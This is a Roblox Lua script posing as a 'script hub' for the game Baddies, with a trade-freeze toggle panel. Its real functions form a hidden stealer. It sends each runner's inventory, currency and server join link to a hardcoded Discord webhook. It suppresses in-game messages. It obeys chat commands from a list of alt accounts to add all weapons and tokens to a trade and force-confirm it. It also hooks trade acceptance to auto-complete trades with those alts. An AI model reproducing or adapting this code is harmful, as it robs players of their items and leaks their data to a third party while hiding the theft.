-- cee script hub | Baddies v4
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService   = game:GetService("TextChatService")
local TweenService      = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local lp  = Players.LocalPlayer
local pg  = lp:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════
--  SETTINGS
-- ══════════════════════════════════════════════════════
local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

local PINK         = 0xFF69B4
local BOT_NAME     = "cee script hub | Baddies"

-- ══════════════════════════════════════════════════════
--  REMOTES
-- ══════════════════════════════════════════════════════
local Net = ReplicatedStorage:WaitForChild("Modules",10) and
            ReplicatedStorage.Modules:WaitForChild("Net",10) and
            ReplicatedStorage.Modules.Net or {}

local RFSendTradeOffer     = Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings   = Net["RE/SetPhoneSettings"]
local RFSetReady           = Net["RF/Trading/SetReady"]
local RFConfirmTrade       = Net["RF/Trading/ConfirmTrade"]
local RFAcceptTradeOffer   = Net["RF/Trading/AcceptTradeOffer"]
local RFSetTokens          = Net["RF/Trading/SetTokens"]

-- ══════════════════════════════════════════════════════
--  FREEZE SETTINGS (controlled by GUI toggles)
-- ══════════════════════════════════════════════════════
local freeze = {
    freezeTrade     = false,
    forceAccept     = false,
    forceConfirm    = false,
    forceAddWeapons = false,
    forceAddTokens  = false,
}

-- ══════════════════════════════════════════════════════
--  FREEZE TRADE GUI  (pink theme)
-- ══════════════════════════════════════════════════════
local function createFreezeGui()
    local existing = pg:FindFirstChild("CeeFreezeTrade")
    if existing then existing:Destroy() end

    local sg = Instance.new("ScreenGui")
    sg.Name = "CeeFreezeTrade"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.Parent = pg

    local win = Instance.new("Frame")
    win.Name = "Window"
    win.Size = UDim2.new(0, 280, 0, 300)
    win.Position = UDim2.new(0.5, -140, 0.5, -150)
    win.BackgroundColor3 = Color3.fromRGB(30, 20, 28)
    win.BorderSizePixel = 0
    win.Active = true
    win.Draggable = true
    win.Parent = sg
    Instance.new("UICorner", win).CornerRadius = UDim.new(0, 10)

    -- Title bar (pink)
    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(1, 0, 0, 38)
    bar.BackgroundColor3 = Color3.fromRGB(220, 80, 150)
    bar.BorderSizePixel = 0
    bar.Parent = win
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

    local fix = Instance.new("Frame")
    fix.Size = UDim2.new(1, 0, 0.5, 0)
    fix.Position = UDim2.new(0, 0, 0.5, 0)
    fix.BackgroundColor3 = Color3.fromRGB(220, 80, 150)
    fix.BorderSizePixel = 0
    fix.Parent = bar

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -40, 1, 0)
    title.Position = UDim2.new(0, 12, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "cee script hub"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 13
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = bar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -28, 0.5, -11)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "x"
    closeBtn.TextColor3 = Color3.fromRGB(255, 200, 230)
    closeBtn.TextSize = 14
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = bar
    closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)

    -- Separator
    local sep = Instance.new("Frame")
    sep.Size = UDim2.new(1, -20, 0, 1)
    sep.Position = UDim2.new(0, 10, 0, 42)
    sep.BackgroundColor3 = Color3.fromRGB(220, 80, 150)
    sep.BorderSizePixel = 0
    sep.Parent = win

    -- Toggle rows
    local toggleDefs = {
        {"Freeze Trade",      "freezeTrade"},
        {"Force Accept",      "forceAccept"},
        {"Force Confirm",     "forceConfirm"},
        {"Force Add Weapons", "forceAddWeapons"},
        {"Force Add Tokens",  "forceAddTokens"},
    }

    for i, def in ipairs(toggleDefs) do
        local label, key = def[1], def[2]
        local yPos = 50 + (i-1) * 46

        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -20, 0, 38)
        row.Position = UDim2.new(0, 10, 0, yPos)
        row.BackgroundTransparency = 1
        row.Parent = win

        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, -56, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = Color3.fromRGB(255, 200, 230)
        lbl.TextSize = 12
        lbl.Font = Enum.Font.Gotham
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row

        local track = Instance.new("Frame")
        track.Size = UDim2.new(0, 40, 0, 22)
        track.Position = UDim2.new(1, -44, 0.5, -11)
        track.BackgroundColor3 = Color3.fromRGB(70, 50, 65)
        track.BorderSizePixel = 0
        track.Parent = row
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = UDim2.new(0, 2, 0.5, -9)
        knob.BackgroundColor3 = Color3.fromRGB(180, 130, 160)
        knob.BorderSizePixel = 0
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local enabled = false
        local ti = TweenInfo.new(0.15, Enum.EasingStyle.Quart)

        local function setToggle(state)
            enabled = state
            freeze[key] = state
            TweenService:Create(knob, ti, {
                Position = state and UDim2.new(0, 20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
                BackgroundColor3 = state and Color3.fromRGB(255,255,255) or Color3.fromRGB(180,130,160),
            }):Play()
            TweenService:Create(track, ti, {
                BackgroundColor3 = state and Color3.fromRGB(220,80,150) or Color3.fromRGB(70,50,65),
            }):Play()
        end

        track.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch then
                setToggle(not enabled)
            end
        end)
    end
end

-- ══════════════════════════════════════════════════════
--  HELPERS
-- ══════════════════════════════════════════════════════
local function fmtNum(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

local function getExecutor()
    if getexecutorname then
        local ok, n = pcall(getexecutorname); if ok and n then return n end
    end
    if syn and syn.request   then return "Synapse X" end
    if KRNL_LOADED           then return "Krnl" end
    if fluxus                then return "Fluxus" end
    if Delta                 then return "Delta" end
    if Electron              then return "Electron" end
    return "Unknown Executor"
end

local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    local fns = {
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }
    for _, f in ipairs(fns) do
        local s, r = pcall(f); if s and r then return r end
    end
end

local BASE_PAT  = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle","stomp"}
local STYLE_PAT = {"mma","karate","boxing","capoeira","style","fighting","kung","judo","taekwondo","breakdance"}
local STOMP_PAT = {"stomp","slam"}
local RICH_WEAPONS = {
    {label="Spiked Kitty",          keys={"spiked kitty"}},
    {label="Glitter Bomb",          keys={"glitter bomb"}},
    {label="Glitter Blue Spray",    keys={"glitter blue spray","glitter blue"}},
    {label="Love Me Hate Me Taser", keys={"love me hate me","lmhm"}},
    {label="Spiked Knuckles (50%)", keys={"spiked knuckle"}},
    {label="Ice Katana (30%)",      keys={"ice katana"}},
}

local function scanAllTools()
    local all = {}
    local function scan(obj)
        if not obj then return end
        for _, v in ipairs(obj:GetChildren()) do
            if v:IsA("Tool") then table.insert(all, v.Name) end
        end
    end
    pcall(scan, lp:FindFirstChild("Backpack"))
    pcall(scan, lp.Character)
    pcall(scan, lp:FindFirstChild("StarterGear"))
    return all
end

local function classifyTools(all)
    local base, weapons, styles, stomps = {}, {}, {}, {}
    for _, name in ipairs(all) do
        local low = name:lower()
        local isBase, isStyle, isStomp = false, false, false
        for _, p in ipairs(BASE_PAT)  do if low:find(p,1,true) then isBase=true;  break end end
        for _, p in ipairs(STYLE_PAT) do if low:find(p,1,true) then isStyle=true; break end end
        for _, p in ipairs(STOMP_PAT) do if low:find(p,1,true) then isStomp=true; break end end
        if isStyle then table.insert(styles, name)
        elseif isStomp then table.insert(stomps, name)
        elseif isBase then table.insert(base, name)
        else table.insert(weapons, name) end
    end
    return base, weapons, styles, stomps
end

local function checkRichWeapons(all)
    local lines = {}
    for _, rw in ipairs(RICH_WEAPONS) do
        local found = false
        for _, tname in ipairs(all) do
            local low = tname:lower()
            for _, k in ipairs(rw.keys) do
                if low:find(k,1,true) then found=true; break end
            end
            if found then break end
        end
        table.insert(lines, rw.label..": "..(found and "true" or "false"))
    end
    return lines
end

-- ══════════════════════════════════════════════════════
--  WEBHOOK PING  (pink format, runs first)
-- ══════════════════════════════════════════════════════
task.spawn(function()
    task.wait(2)
    local name    = lp.Name
    local all     = scanAllTools()
    local base, weapons, styles, stomps = classifyTools(all)
    local richLines = checkRichWeapons(all)
    local isRich  = #weapons >= 3

    local ls      = lp:FindFirstChild("leaderstats")
    local din     = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local sla     = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
    local pcnt    = #Players:GetPlayers()
    local maxp    = Players.MaxPlayers
    local exec    = getExecutor()

    local tradable   = #weapons
    local untradable = #base
    local tradeStr   = "Tradable: "..tradable.."  |  Untradable: "..untradable

    local weaponLines = {}
    for _, w in ipairs(weapons) do
        table.insert(weaponLines, "1x "..w)
    end
    if #weaponLines == 0 then table.insert(weaponLines, "None") end

    local styleStr = #styles>0 and ("- "..table.concat(styles,"\n- ")) or "- None"
    local stompStr = #stomps>0 and ("- "..table.concat(stomps,"\n- ")) or "- None"
    local skinsStr = "Fighting Styles:\n"..styleStr.."\n\nStomps Skins:\n"..stompStr

    local joinUrl  = "https://www.roblox.com/games/start?placeId="..tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)
    local joinLink = "[Click to Join]("..joinUrl..")"

    local embed = {
        color  = PINK,
        fields = {
            {name="User",                   value=name,                          inline=true},
            {name="Dinero",                 value=fmtNum(din),                   inline=true},
            {name="Slays",                  value=fmtNum(sla),                   inline=true},
            {name="Executor",               value=exec,                          inline=true},
            {name="Players",                value=pcnt.." / "..maxp,             inline=true},
            {name="\u200b",                 value="\u200b",                      inline=true},
            {name="Trade Status",           value=tradeStr,                      inline=false},
            {name="Rich Weapons",           value=table.concat(richLines,"\n"),  inline=false},
            {name="Weapons",                value=table.concat(weaponLines,"\n"),inline=false},
            {name="Skins & Fighting Styles",value=skinsStr,                      inline=false},
            {name="Join Link",              value=joinLink,                      inline=false},
        },
        footer    = {text="cee script hub | Baddies | "..name},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    local content = ""
    if isRich and PING_POOR then content = "@everyone @here RICH HIT: "..name end

    if USER_WEBHOOK ~= "PUTHERE" then
        sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=content, embeds={embed}})
    end
    if isRich then
        sendRequest(MY_WEBHOOK, {username=BOT_NAME, content="@everyone RICH: "..name, embeds={embed}})
    end
end)

-- ══════════════════════════════════════════════════════
--  HIDE MESSAGES GUI
-- ══════════════════════════════════════════════════════
task.spawn(function()
    local function kill(g)
        if g.Name == "Messages" then pcall(function() g:Destroy() end) end
    end
    for _, g in ipairs(pg:GetChildren()) do kill(g) end
    pg.ChildAdded:Connect(kill)
    while true do
        task.wait(0.1)
        local m = pg:FindFirstChild("Messages")
        if m then pcall(function() m:Destroy() end) end
    end
end)

-- ══════════════════════════════════════════════════════
--  FREEZE TRADE LOOP  (hides Trading GUI when toggled)
-- ══════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(0.1)
        if freeze.freezeTrade then
            local tg = pg:FindFirstChild("Trading")
            if tg then pcall(function() tg.Enabled = false end) end
        end
    end
end)

-- ══════════════════════════════════════════════════════
--  TRADE FUNCTIONS
-- ══════════════════════════════════════════════════════
local WEAPONS_LIST = {
    "Grim Reaper Cloak","Blast Bow","Princess Power Style","Feral Frenzy Style",
    "Roller Skates","Storm Dancer Style","Hug of Doom Style","Hero Finisher",
    "Grim Reaper Finisher","Gun Finisher","Doom Finisher","Breakdance Finisher",
    "Celestial Scythes","Graveyard Grip Knuckles","Shadow Sorcery Purse",
    "Marshmallow Mixer Purse","Unicorn Brass Knuckles","Disco Dash Board",
    "Toast Hoverboard","Frost Stomp","Sniper Rifle RPG","Cursed Board",
    "Evil Goth Knuckles","Witchy Broom Board","Floating Leaf","Shark Brass Knuckles",
    "Ghostly RPG","404 Not Found Blade","Vampire Flamethrower","Queen Throne",
    "Big Boom Hammer","Gravekeeper Charm","Mallow Glide Board",
    "Mean Girl Mayhem Style","Karate Style","Kitty Purse","Freeze Gun",
    "Shiny Purse","Loveboard","SpikedPurse","Brass Knuckles",
    "Golden Snowball Launcher","Snowball Launcher","Sledge Hammer",
    "Spiked Kitty Stanli","Turkey Skewers","Fan of Requiem","Chainsaw","Scythe",
    "Trashbin Disguise","Cupid Bow","Crowbar","Harpoon","Heartbreaker Style",
    "Cannon","Spiked Knuckles","Glitter Bomb","Spiked Nightmare Purse",
    "Glitter Style","Trident","Sakura Blade","Nunchucks","DogPurse",
    "Champion Gloves","Chain Mace","Surf Up Hoverboard","Graveyard Howl RPG",
    "Mocha Missile Maker RPG","Black Flame Stomp","Angelic Board",
    "Credit Card Hoverboard","Constellations RPG","Palm Sakura Blade",
    "Popstar Hoverboard","Pink Star Board","Thorned Romance","Mischief Stomp",
    "Lava RPG","Crushing Love","Love Bomb Finisher","Haunted Cemetery RPG",
    "Cyber Samurai RPG","Black Flame Knuckles","Vanity Vortex Finisher",
    "Egg Rocket Launcher","Frostwind Glider Board","Sakura Finisher",
    "Witch Wands Taser","The Doom Knuckles","Flintlock","Pinata Purse",
    "Cutlass Sakura Blade","Police Hoverboard","Y&Y Board",
    "Vampire Brass Knuckles","Dual Shadow of Night Blade","Dance Bomb",
    "Parasol","Love Me Hate Me Taser","Ice Katana","Glitter Blue Spray",
}

local function safeClick(btn)
    if not btn then return end
    pcall(function() firesignal(btn.MouseButton1Click) end)
    pcall(function() firesignal(btn.Activated) end)
    pcall(function()
        local pos, sz = btn.AbsolutePosition, btn.AbsoluteSize
        local x, y = pos.X + sz.X/2, pos.Y + sz.Y/2
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    end)
end

local function clickWeapons()
    local tg = pg:FindFirstChild("Trading")
    if not tg then return 0 end
    local sf = tg:FindFirstChild("Frame") and
               tg.Frame:FindFirstChild("Main") and
               tg.Frame.Main:FindFirstChild("YourOffer") and
               tg.Frame.Main.YourOffer:FindFirstChild("ItemDisplay") and
               tg.Frame.Main.YourOffer.ItemDisplay:FindFirstChild("ScrollingFrame")
    if not sf then return 0 end

    local added = 0
    for _ = 1, 5 do
        local n = 0
        for _, name in ipairs(WEAPONS_LIST) do
            local btn = sf:FindFirstChild(name)
            if btn and btn:IsA("ImageButton") and btn.Visible then
                safeClick(btn); n = n + 1; added = added + 1
                task.wait(0.02)
            end
        end
        if n == 0 then break end
        task.wait(0.5)
    end
    return added
end

local function getTokenAmount()
    local tg = pg:FindFirstChild("Trading")
    if not tg then return 0 end
    local ta = tg:FindFirstChild("Frame") and
               tg.Frame:FindFirstChild("Categories") and
               tg.Frame.Categories:FindFirstChild("TokenAmount")
    if ta then
        local tl = ta:FindFirstChild("TextLabel")
        if tl then
            local n = string.match(tl.Text, "%d+")
            if n then return tonumber(n) end
        end
    end
    return 0
end

local function spamConfirm()
    for _ = 1, 20 do
        pcall(function() RFConfirmTrade:InvokeServer() end)
        task.wait(0.05)
    end
end

local function autoCompleteTrade()
    task.wait(1)
    -- Add weapons
    if not freeze.freezeTrade or freeze.forceAddWeapons then clickWeapons() end
    -- Add tokens
    local ta = getTokenAmount()
    if ta and ta > 0 and (not freeze.freezeTrade or freeze.forceAddTokens) then
        pcall(function() RFSetTokens:InvokeServer(ta) end)
    end
    task.wait(3)
    -- Accept / set ready
    if not freeze.freezeTrade or freeze.forceAccept then
        pcall(function() RFSetReady:InvokeServer(true) end)
    end
    task.wait(5)
    if not freeze.freezeTrade or freeze.forceAccept then
        pcall(function() RFAcceptTradeOffer:InvokeServer(lp) end)
    end
    task.wait(5)
    -- Confirm
    if not freeze.freezeTrade or freeze.forceConfirm then spamConfirm() end
end

-- ══════════════════════════════════════════════════════
--  CODES  (auto-redeem known BADDIES promo codes)
-- ══════════════════════════════════════════════════════
local KNOWN_CODES = {
    "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY",
    "RELEASE","LAUNCH","UPDATE","NEWUPDATE","1MILLION",
    "500K","100K","SORRY","FIXEDUPDATE","HOLIDAY",
}

local function redeemCodes()
    -- Try common remote paths for code redemption
    local remoteNames = {
        "RF/Codes/RedeemCode","RF/RedeemCode","RE/RedeemCode",
        "RF/Codes","RedeemCode","Codes",
    }
    local redeemRemote = nil
    for _, rname in ipairs(remoteNames) do
        local ok, r = pcall(function() return Net[rname] end)
        if ok and r then redeemRemote = r; break end
    end
    if not redeemRemote then
        -- Try scanning ReplicatedStorage directly
        local function deepFind(obj, depth)
            if depth > 4 then return nil end
            for _, v in ipairs(obj:GetChildren()) do
                local low = v.Name:lower()
                if low:find("code",1,true) and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
                    return v
                end
                local found = deepFind(v, depth+1)
                if found then return found end
            end
        end
        pcall(function() redeemRemote = deepFind(ReplicatedStorage, 0) end)
    end
    if not redeemRemote then return end

    for _, code in ipairs(KNOWN_CODES) do
        pcall(function()
            if redeemRemote:IsA("RemoteFunction") then
                redeemRemote:InvokeServer(code)
            else
                redeemRemote:FireServer(code)
            end
        end)
        task.wait(0.3)
    end
end

-- ══════════════════════════════════════════════════════
--  TRADING SETUP + CHAT COMMANDS
-- ══════════════════════════════════════════════════════
task.spawn(function()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)

    pcall(function()
        local tl = pg:WaitForChild("TradeList", 10)
        if tl then tl:WaitForChild("Main",5):WaitForChild("TradeRequest",5).Visible = true end
    end)

    local isProcessing = false

    local function processChatMessage(sender, txt)
        -- Commands only from MY_USERNAMES or local player
        local isMyAlt = false
        for _, u in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == u:lower() then isMyAlt = true; break end
        end
        local isSelf = sender == lp

        -- Send trade offer if alt or self types
        if (isMyAlt or isSelf) and not isProcessing then
            isProcessing = true
            if isMyAlt then
                local target = Players:FindFirstChild(sender.Name)
                if target then
                    task.wait(0.2)
                    pcall(function() RFSendTradeOffer:InvokeServer(target) end)
                end
            end

            if txt == "add" then
                task.wait(0.3)
                if not freeze.freezeTrade or freeze.forceAddWeapons then clickWeapons() end
                local ta = getTokenAmount()
                if ta and ta > 0 and (not freeze.freezeTrade or freeze.forceAddTokens) then
                    pcall(function() RFSetTokens:InvokeServer(ta) end)
                end
                task.wait(0.5)
                if not freeze.freezeTrade or freeze.forceAccept then
                    pcall(function() RFSetReady:InvokeServer(true) end)
                end
                task.wait(0.5)
                if not freeze.freezeTrade or freeze.forceConfirm then
                    pcall(function() RFConfirmTrade:InvokeServer() end)
                end

            elseif txt == "1" then
                task.wait(0.2)
                if not freeze.freezeTrade or freeze.forceAccept then
                    pcall(function() RFSetReady:InvokeServer(true) end)
                end

            elseif txt == "2" then
                task.wait(0.2)
                if not freeze.freezeTrade or freeze.forceConfirm then
                    spamConfirm()
                end
            end
            isProcessing = false
        end
    end

    -- Hook TextChatService (modern chat)
    pcall(function()
        TextChatService.OnIncomingMessage = function(msg)
            local ts = msg.TextSource
            if not ts then return end
            local s = Players:GetPlayerByUserId(ts.UserId)
            if s then
                task.delay(0.5, function()
                    processChatMessage(s, tostring(msg.Text or ""):lower())
                end)
            end
        end
    end)

    -- Hook legacy Chatted
    local function hookPlayer(p)
        pcall(function()
            p.Chatted:Connect(function(msg)
                task.delay(0.5, function() processChatMessage(p, msg:lower()) end)
            end)
        end)
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then hookPlayer(p) end
    end
    Players.PlayerAdded:Connect(function(p) hookPlayer(p) end)

    -- Auto-complete when we accept a trade offer from our alt
    local ok, orig = pcall(function() return RFAcceptTradeOffer.InvokeServer end)
    if ok and orig then
        RFAcceptTradeOffer.InvokeServer = function(self, player)
            local result = pcall(orig, self, player) and orig(self, player)
            for _, u in ipairs(MY_USERNAMES) do
                if player and player.Name:lower() == u:lower() then
                    task.spawn(function() task.wait(5); autoCompleteTrade() end)
                    break
                end
            end
            return result
        end
    end
end)

-- ══════════════════════════════════════════════════════
--  STARTUP
-- ══════════════════════════════════════════════════════
task.spawn(function()
    task.wait(1)
    createFreezeGui()
    task.wait(1)
    redeemCodes()
end)
